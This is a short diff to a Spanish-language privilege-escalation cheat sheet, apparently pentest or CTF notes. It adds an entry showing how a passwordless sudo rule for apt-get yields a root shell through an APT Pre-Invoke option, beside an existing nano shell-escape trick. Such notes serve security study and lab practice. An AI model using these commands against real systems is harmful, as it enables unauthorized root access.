@@ -246,7 +246,6 @@ Paso 4:
 ```
 
 ## check_log
-
 ```bash 
 ❯ sudo -l       
 # Ejecutar el script 'check_log' como root sin password
@@ -257,4 +256,14 @@ Paso 4:
 # Dentro de NANO
 ❯ ^R^X = (Ctrl + R, Crtl + X)
 ❯ reset; sh 1>&0 2>&0
+```
+
+### apt-get
+```bash 
+❯ sudo -l       
+# Ejecutar 'apt-get' como root sin password
+(ALL) NOPASSWD: /usr/bin/apt-get
+
+# Shell como root directamente 
+❯ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
 ```
